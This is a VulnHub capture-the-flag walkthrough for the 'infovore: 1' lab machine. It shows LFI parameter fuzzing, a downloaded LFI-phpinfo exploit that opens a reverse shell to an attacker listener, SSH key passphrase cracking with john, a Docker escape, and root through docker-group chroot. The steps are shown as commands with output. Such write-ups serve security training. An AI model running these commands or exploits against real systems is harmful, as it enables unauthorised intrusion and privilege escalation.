# VulnHub > infovore: 1

**About Release**

* Name: infovore: 1
* Date release: 24 Jun 2020
* Author: @theart42 & @4nqr34z
* Series: infovore

**Description**

This is an easy to intermediate box that shows you how you can exploit innocent looking php functions and lazy sys admins.

There are 4 flags in total to be found, and you will have to think outside the box and try alternative ways to achieve your goal of capturing all flags.

VM has been tested on VirtualBox 6.1.10 and VMWare (Fusion)

Enjoy! @theart42 and @4nqr34z

**Download**

* infovore_vulnhub.ova (Size: 625 MB)
* Download (Mirror): https://download.vulnhub.com/infovore/infovore_vulnhub.ova
* Download (Torrent): https://download.vulnhub.com/infovore/infovore_vulnhub.ova.torrent ([Magnet](magnet:?xt=urn:btih:3882271341E1E2B7DB83BCBF2CEFD9A9AD6D3231&dn=infovore_vulnhub.ova&tr=http%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80/announce&tr=udp%3A%2F%2Ftracker.publicbt.com%3A80/announce&tr=udp%3A%2F%2Ftracker.istole.it%3A6969))

# Services Enumeration

Only 1 service is running on the host.

~~~
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Include me ...
~~~

# Web enumeration

The default page is a static page with only dead links. Its title is "Include Me ...".

There is no `robots.txt` file but the web enumeration with `gobuster` reveals the presence of `/info.php` which displays the results of the `phpinfo()` PHP function. 

~~~
kali@kali:~$ gobuster dir -u http://infovore.box -x php,txt,bak,old,tar,zip,gz -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://infovore.box
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,bak,old,tar,zip,gz,php
[+] Timeout:        10s
===============================================================
2020/09/28 07:48:35 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htaccess.gz (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.bak (Status: 403)
/.htaccess.old (Status: 403)
/.htaccess.tar (Status: 403)
/.htaccess.zip (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.bak (Status: 403)
/.htpasswd.old (Status: 403)
/.htpasswd.tar (Status: 403)
/.htpasswd.zip (Status: 403)
/.htpasswd.gz (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/.hta (Status: 403)
/.hta.php (Status: 403)
/.hta.txt (Status: 403)
/.hta.bak (Status: 403)
/.hta.old (Status: 403)
/.hta.tar (Status: 403)
/.hta.zip (Status: 403)
/.hta.gz (Status: 403)
/css (Status: 301)
/img (Status: 301)
/index.php (Status: 200)
/index.html (Status: 200)
/index.php (Status: 200)
/info.php (Status: 200)
/info.php (Status: 200)
/server-status (Status: 403)
/vendor (Status: 301)
===============================================================
2020/09/28 07:48:43 Finished
===============================================================
~~~

# Initial foothold (LFI)

## index.php parameter

Both `index.html` and `index.php` exists. Considering that the title of the page refers to "inclusion", the `index.php` page is likely expecting a parameter. Let's fuzz it:

~~~
kali@kali:~$ wfuzz -u http://infovore.box?FUZZ=/etc/passwd -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hh 4743

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://infovore.box?FUZZ=/etc/passwd/
Total requests: 220560

===================================================================
ID           Response   Lines    Word     Chars       Payload                                             
===================================================================

000025370:   200        7 L      9 W      80 Ch       "filename"                                          

Total time: 319.7642
Processed Requests: 220560
Filtered Requests: 220559
Requests/sec.: 689.7580
~~~

Indeed, the `index.php` page is accepting the `filename` parameter:

~~~
kali@kali:/data/infovore_1/files$ curl -s http://infovore.box?filename=/etc/passwd
<html>
<title>Include me ...</title>
<body>
<p>
<pre>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
</pre></p>
</body>
</html>
~~~

However, it seems that we can only provide `/etc/passwd` as no other file can be read.

## LFI / phpinfo

Searching for "LFI" and "phpinfo" on the Internet led to this interesting resource: https://github.com/M4LV0/LFI-phpinfo-RCE. Let's download the exploit and tune it:

~~~
$ wget https://raw.githubusercontent.com/M4LV0/LFI-phpinfo-RCE/master/exploit.py
$ sed -i "s/127.0.0.1/172.16.222.128/" exploit.py
$ sed -i "s/3333/4444/" exploit.py
$ sed -i "s/phpinfo.php/info.php/" exploit.py 
$ sed -i "s/?lfi=/?filename=/" exploit.py
~~~

Now, start a listener (`rlwrap nc -nlvp 4444`) and run the exploit:

~~~
kali@kali:/data/infovore_1/files$ python exploit.py infovore.box
LFI With PHPInfo()
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Getting initial offset... found [tmp_name] at 98096
Spawning worker pool (10)...

Got it! Shell created in /tmp/g

Woot!  \m/
Shuttin' down...
~~~

A reverse shell is spawned in our listener window:

~~~
kali@kali:~$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [172.16.222.128] from (UNKNOWN) [172.16.222.147] 48199
Linux e71b67461f6c 3.16.0-6-amd64 #1 SMP Debian 3.16.56-1+deb8u1 (2018-05-08) x86_64 GNU/Linux
 08:34:39 up 51 min,  0 users,  load average: 0.00, 0.06, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ SHELL=/bin/bash script -q /dev/null
www-data@e71b67461f6c:/$ 
~~~

# Flag 1

The first flag can be found in the `/var/www/html` directory: 

~~~
$ cd /var/www/html
$ ls -la
total 312
drwxrwxrwx 6 www-data www-data   4096 Jun 22 22:39 .
drwxr-xr-x 5 root     root       4096 Jun 22 22:39 ..
-r--r--r-- 1 root     root         42 Jun 22 21:40 .user.txt
drwxr-xr-x 2 root     root       4096 Apr 27 10:55 css
-rw-r--r-- 1 root     root       2544 Sep 16  2019 gulpfile.js
drwxr-xr-x 2 root     root       4096 Apr 27 10:55 img
-rw-r--r-- 1 root     root       4674 Sep 16  2019 index.html
-rw-r--r-- 1 root     root        416 Jun  1 12:18 index.php
-rw-r--r-- 1 root     root         19 Apr 26 14:23 info.php
-rw-r--r-- 1 root     root     262191 Sep 16  2019 package-lock.json
-rw-r--r-- 1 root     root       1319 Sep 16  2019 package.json
drwxr-xr-x 2 root     root       4096 Apr 27 10:55 scss
drwxr-xr-x 4 root     root       4096 Sep 16  2019 vendor
$ cat .user.txt
FLAG{Now_You_See_phpinfo_not_so_harmless}
~~~

# Flag 2

The random hostname and the presence of `/.dockerenv` confirms that we are in a docker environment:

~~~
$ cd /
$ hostname
e71b67461f6c
$ ls -la
total 464
drwxr-xr-x 74 root root   4096 Jun 23 10:59 .
drwxr-xr-x 74 root root   4096 Jun 23 10:59 ..
-rwxr-xr-x  1 root root      0 Jun 22 22:39 .dockerenv
-rw-r--r--  1 root root   1197 Apr 27 10:18 .oldkeys.tgz
drwxr-xr-x  2 root root   4096 Jun  9 13:43 bin
drwxr-xr-x  2 root root   4096 May  2 16:39 boot
-rw-------  1 root root 397312 Jun 22 22:39 core
drwxr-xr-x  5 root root    360 Sep 28 07:42 dev
drwxr-xr-x 63 root root   4096 Jun 22 22:39 etc
drwxr-xr-x  2 root root   4096 May  2 16:39 home
drwxr-xr-x 13 root root   4096 Jun  9 13:43 lib
drwxr-xr-x  2 root root   4096 Jun  7 00:00 lib64
drwxr-xr-x  2 root root   4096 Jun  7 00:00 media
drwxr-xr-x  2 root root   4096 Jun  7 00:00 mnt
drwxr-xr-x  2 root root   4096 Jun  7 00:00 opt
dr-xr-xr-x 95 root root      0 Sep 28 07:42 proc
drwx------  4 root root   4096 Jun 23 10:59 root
drwxr-xr-x  6 root root   4096 Jun 22 22:39 run
drwxr-xr-x  2 root root   4096 Jun  9 13:43 sbin
drwxr-xr-x  2 root root   4096 Jun  7 00:00 srv
dr-xr-xr-x 13 root root      0 Sep 28 07:42 sys
drwxrwxrwt  2 root root   4096 Sep 28 08:34 tmp
drwxr-xr-x 41 root root   4096 Jun 22 22:39 usr
drwxr-xr-x 31 root root   4096 Jun 22 22:39 var
~~~

There is an interesting file at the root of the filesystem: `.oldkeys.tgz`. As `python` and `nc` are not available, let's copy the file to the web directory to be able to download the file.

~~~
www-data@e71b67461f6c:/var/www/html$ cp /.oldkeys.tgz .
cp /.oldkeys.tgz .
www-data@e71b67461f6c:/var/www/html$ ls -la
ls -la
total 316
drwxrwxrwx 6 www-data www-data   4096 Sep 28 10:59 .
drwxr-xr-x 6 root     root       4096 Sep 28 10:59 ..
-rw-r--r-- 1 www-data www-data   1197 Sep 28 10:59 .oldkeys.tgz
-r--r--r-- 1 root     root         42 Jun 22 21:40 .user.txt
drwxr-xr-x 2 root     root       4096 Apr 27 10:55 css
-rw-r--r-- 1 root     root       2544 Sep 16  2019 gulpfile.js
drwxr-xr-x 2 root     root       4096 Apr 27 10:55 img
-rw-r--r-- 1 root     root       4674 Sep 16  2019 index.html
-rw-r--r-- 1 root     root        416 Jun  1 12:18 index.php
-rw-r--r-- 1 root     root         19 Apr 26 14:23 info.php
-rw-r--r-- 1 root     root     262191 Sep 16  2019 package-lock.json
-rw-r--r-- 1 root     root       1319 Sep 16  2019 package.json
drwxr-xr-x 2 root     root       4096 Apr 27 10:55 scss
drwxr-xr-x 4 root     root       4096 Sep 16  2019 vendor
~~~

Download it with wget and uncompress the archive. It contains the root public and private keys. Brute forcing the private key's password reveals that the password is `choclate93`.

~~~
kali@kali:/data/infovore_1/files$ /data/src/john/run/ssh2john.py root > root.hash
kali@kali:/data/infovore_1/files$ /data/src/john/run/john root.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Note: This format may emit false positives, so it will keep trying even after finding a
possible candidate.
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
choclate93       (root)
1g 0:00:00:05 DONE (2020-09-28 11:08) 0.1694g/s 2430Kp/s 2430Kc/s 2430KC/sa6_123..*7¡Vamos!
Session completed. 
~~~

Let's try to connect as root using the same password: `choclate93`.

~~~
www-data@e71b67461f6c:/var/www/html$ su root
su root
Password: choclate93

root@e71b67461f6c:/var/www/html# id
id
uid=0(root) gid=0(root) groups=0(root)
~~~

It worked. Let's get the docker root flag:

~~~
root@e71b67461f6c:/var/www/html# cd /root
cd /root
root@e71b67461f6c:~# ls -la
ls -la
total 24
drwx------  4 root root 4096 Jun 23 10:59 .
drwxr-xr-x 75 root root 4096 Sep 28 10:59 ..
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Jun 23 10:59 .ssh
-r--------  1 root root   79 Jun 22 21:41 root.txt
root@e71b67461f6c:~# cat root.txt
cat root.txt
FLAG{Congrats_on_owning_phpinfo_hope_you_enjoyed_it}

And onwards and upwards!
~~~

# Flag 3

## Escape privileged docker container

There is a `.ssh` directory in the `/root` folder, which contains keys. The public key reveals that we can connect as `admin` to `192.168.150.1`.

~~~
root@e71b67461f6c:~/.ssh# cat id_rsa.pub
cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDN/keLDJowDdeSdHZz26wS1M2o2/eiJ99+acchRJr0lZE0YmqbfoIo+n75VS+eLiT03yonunkVp+lhK+uey7/Tu8JsQSHK1F0gci5FG7MKRU4/+m+0CODwVFTNgw3E4FKg5qu+nt6BkBThU3Vnhe/Ujbp5ruNjb4pPajll2Pv5dyRfaRrn0DTnhpBdeXWdIhU9QQgtxzmUXed/77rV6m4AL4+iENigp3YcPOjF7zUG/NEop9c1wdGpjSEhv/ftjyKoazFEmOI1SGpD3k9VZlIUFs/uw6kRVDJlg9uxT4Pz0tIEMVizlV4oZgcEyOJ9NkSe6ePUAHG7F+v7VjbYdbVh admin@192.168.150.1
root@e71b67461f6c:~/.ssh# ssh admin@192.168.150.1
ssh admin@192.168.150.1
Enter passphrase for key '/root/.ssh/id_rsa': 

admin@192.168.150.1's password: 
~~~

The private key is password protected, and the password is `choclate93`:

~~~
kali@kali:/data/infovore_1/files$ /data/src/john/run/john admin.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Note: This format may emit false positives, so it will keep trying even after finding a
possible candidate.
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
choclate93       (admin.key)
1g 0:00:00:06 DONE (2020-09-28 11:15) 0.1661g/s 2382Kp/s 2382Kc/s 2382KC/sa6_123..*7¡Vamos!
Session completed. 
~~~

Let's connect:

~~~
root@e71b67461f6c:~/.ssh# ssh admin@192.168.150.1
ssh admin@192.168.150.1
Enter passphrase for key '/root/.ssh/id_rsa': choclate93


The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jun 23 05:59:43 2020 from 192.168.150.21
admin@infovore:~$ id
id
uid=1000(admin) gid=1000(admin) groups=1000(admin),999(docker)
admin@infovore:~$ hostname
hostname
infovore
~~~

## Flag

We sucessfully escaped from the docker environment. Let's get the third flag:

~~~
admin@infovore:~$ cat admin.txt
cat admin.txt
FLAG{Escaped_from_D0ck3r}
~~~

# Flag 4

The `admin` user belongs to the `docker` group: 

~~~
admin@infovore:~$ id
id
uid=1000(admin) gid=1000(admin) groups=1000(admin),999(docker)
~~~

[GTFOBins](https://gtfobins.github.io/gtfobins/docker/#shell) confirms that we can take advantage of this to elevate our privileges:

~~~
admin@infovore:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
df20fa9351a1: Pull complete 
Digest: sha256:185518070891758909c9f839cf4ca393ee977ac378609f700f60a771a2dfe321
Status: Downloaded newer image for alpine:latest
# id
id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
~~~

Now, let's get the flag:

~~~
# cd /root
cd /root
# ls -la
ls -la
total 28
drwx------  4 root root 4096 Jun 23 06:19 .
drwxr-xr-x 22 root root 4096 Apr 17 09:15 ..
lrwxrwxrwx  1 root root    9 Apr 22 07:04 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwx------  2 root root 4096 Apr 23 02:04 .gnupg
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
drwx------  2 root root 4096 Jun  1 10:18 .ssh
-r--------  1 root root 1511 Jun 22 16:49 root.txt
# cat root.txt
cat root.txt
 _____                             _       _                                              
/  __ \                           | |     | |                                             
| /  \/ ___  _ __   __ _ _ __ __ _| |_ ___| |                                             
| |    / _ \| '_ \ / _` | '__/ _` | __/ __| |                                             
| \__/\ (_) | | | | (_| | | | (_| | |_\__ \_|                                             
 \____/\___/|_| |_|\__, |_|  \__,_|\__|___(_)                                             
                    __/ |                                                                 
                   |___/                                                                  
__   __                                         _   _        __                         _ 
\ \ / /                                        | | (_)      / _|                       | |
 \ V /___  _   _   _ ____      ___ __   ___  __| |  _ _ __ | |_ _____   _____  _ __ ___| |
  \ // _ \| | | | | '_ \ \ /\ / / '_ \ / _ \/ _` | | | '_ \|  _/ _ \ \ / / _ \| '__/ _ \ |
  | | (_) | |_| | | |_) \ V  V /| | | |  __/ (_| | | | | | | || (_) \ V / (_) | | |  __/_|
  \_/\___/ \__,_| | .__/ \_/\_/ |_| |_|\___|\__,_| |_|_| |_|_| \___/ \_/ \___/|_|  \___(_)
                  | |                                                                     
                  |_|                                                                     
 
FLAG{And_now_You_are_done}

@theart42 and @4nqr34z
 
~~~
